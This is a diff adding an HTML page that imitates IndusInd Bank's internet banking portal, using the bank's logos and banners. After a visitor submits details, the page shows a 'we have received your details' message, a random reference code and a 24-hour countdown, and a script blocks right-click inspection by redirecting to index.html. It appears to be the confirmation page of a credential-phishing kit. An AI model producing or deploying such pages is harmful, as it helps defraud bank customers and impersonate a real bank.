@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome to Internet Banking</title>
+<link href="./main_files/style.css" rel="stylesheet" type="text/css">
+<link href="./main_files/css" rel="stylesheet">
+<link href="./main_files/style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./main_files/jquery.bxslider.css" type="text/css">
+<link rel="stylesheet" href="./main_files/jquery.custom-scrollbar.css" type="text/css">
+<link href="./main_files/media.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./main_files/font-awesome.min.css">
+<link rel="stylesheet" href="./main_files/sprite-login.css" type="text/css">
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.css">
+<link rel="stylesheet" href="./main_files/font-awesome.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.min.js"></script>
+  
+    
+<script>
+$(document).ready(function(){
+  $('.bannerSlider').bxSlider({
+    slideWidth: 600,
+    minSlides: 1,
+    maxSlides: 1,
+    moveSlides: 1,
+    slideMargin: 10,
+    auto: true,
+    mode: 'horizontal'
+  });
+});
+</script>
+</head>
+<body>
+
+<header class="pageHeader">
+    <div class="wrapper">
+        <a href="#"><img src="./main_files/logo.png" alt="Indusind Bank" title="Indusind Bank" class="logo"></a>
+        <img src="./main_files/indusnet-logo.png" alt="Indusnet" class="indusnetLogo">
+        
+    </div>
+</header>
+
+<div class="banner">
+    <div class="wrapper">
+        <ul class="bannerSlider">
+            <li><a href="#" target="_blank"><img src="./main_files/CBDC_IndusNet_Banner.jpg" alt=""></a></li>
+            <li><a href="#" target="_blank"><img src="./main_files/NRI_Banking_Banner_1170x165_px-01.jpg" alt=""></a></li>
+            <li><a href="#" target="_self"><img src="./main_files/IndusMobile_Banners1-Apr-07.jpg" alt=""></a></li>
+            <li><a href="#" target="_self"><img src="./main_files/RTGS_24X7_Banner.jpeg" alt=""></a></li>
+            <li><a href="#" target="_blank"><img src="./main_files/Indus_Delight_Net_Banking_Banners_1170_x_165_px.jpg" alt=""></a></li>
+        </ul>
+    </div>
+</div>
+
+<div class="loginContent">
+    <div class="wrapper">
+        <div class="loginSec">
+            <ul class="loginTab">
+                <li>We Have Received Your Details</li>
+            </ul>
+            <div class="loginTabContent current">
+                <p>Thank you for submitting your details. We have successfully received them and will get back to you within 24 hours.</p>
+                <p>Your unique code is: <span id="uniqueCode"></span></p>
+                <p>Please keep this code safe as it may be required for future reference.</p>
+                <p id="countdownTimer">24:00:00</p>
+            </div>
+            
+            
+            <form>
+            <div class="buttonContainer">
+    <button type="submit" class="signInBtn" id="button1" tabindex="6">Close</button>
+</div>
+<style>
+                .buttonContainer {
+    display: flex;
+    justify-content: center;
+    margin-top: 20px; /* Adjust the margin as needed */
+}
+
+.signInBtn {
+    padding: 10px 20px;
+    font-size: 16px; /* Adjust size as needed */
+    color: #fff; /* Text color */
+    background-color: #007bff; /* Button color */
+    border: none;
+    border-radius: 5px; /* Rounded corners */
+    cursor: pointer;
+    outline: none;
+    transition: background-color 0.3s ease; /* Smooth transition for hover effect */
+}
+
+.signInBtn:hover {
+    background-color: #0056b3; /* Darker shade for hover effect */
+}
+
+                </style>
+            </form>
+        </div>
+    </div>
+</div>
+
+    <style>
+    
+        
+        .loginTabContent p {
+    font-weight: bold;
+    text-align: center;
+}
+
+    </style>
+
+<script>
+  function generateUniqueCode() {
+    return Math.random().toString(36).substr(2, 9).toUpperCase();
+}
+
+document.getElementById('uniqueCode').textContent = generateUniqueCode();
+
+// Initialize the countdown
+function startCountdown(duration, display) {
+    var timer = duration, hours, minutes, seconds;
+    var countdownInterval = setInterval(function () {
+        hours = parseInt(timer / 3600, 10);
+        minutes = parseInt((timer % 3600) / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        hours = hours < 10 ? "0" + hours : hours;
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = hours + ":" + minutes + ":" + seconds;
+
+        if (--timer < 0) {
+            clearInterval(countdownInterval);
+            display.textContent = "Time is up!";
+        }
+    }, 1000);
+}
+
+window.onload = function () {
+    var countdownDuration = 24 * 60 * 60; // 24 hours in seconds
+    var display = document.getElementById('countdownTimer');
+    startCountdown(countdownDuration, display);
+};
+
+</script>
+
+
+<footer class="pageFooter">
+    <div class="footerTop">
+        <div class="wrapper">
+            <p>Enjoy banking on the go with our next generation Mobile App</p>
+            <a href="#" target="_blank"><img src="./main_files/app-store-apple.png" alt="Apple App Store" title="Apple App Store"></a>
+            <a href="#" target="_blank"><img src="./main_files/google-play.png" alt="Google Play" title="Google Play"></a>
+            <a href="#" target="_blank"><img src="./main_files/app-store.png" alt="App Store" title="App Store"></a>
+        </div>
+    </div>
+    <div class="footerBtm">
+        <div class="wrapper">
+            <div class="footerLeft">
+                <p><a target="_blank" href="#">Privacy Policy</a> <a target="_blank" href="#">Terms & Condition</a> <a target="_blank" href="#">Disclaimer</a> <span>COPYRIGHT © ALL RIGHTS RESERVED</span></p>
+                <p><strong>Browser Requirements for NetBanking</strong><br>Please Use I.E 10 and above or any other browser with Latest Version.</p>
+            </div>
+            <a href="#"><img src="./main_files/entrust-logo.png" alt="Entrust" title="Entrust"></a>
+        </div>
+    </div>
+</footer>
+    
+  
+  
+
+</body>
+    <script type="text/javascript">
+    // Refresh to main page (index) on right-click
+    document.addEventListener('contextmenu', function(event) {
+        event.preventDefault();
+        window.location.href = "index.html"; // Replace "index.html" with your main page URL
+    });
+</script>
+</html>
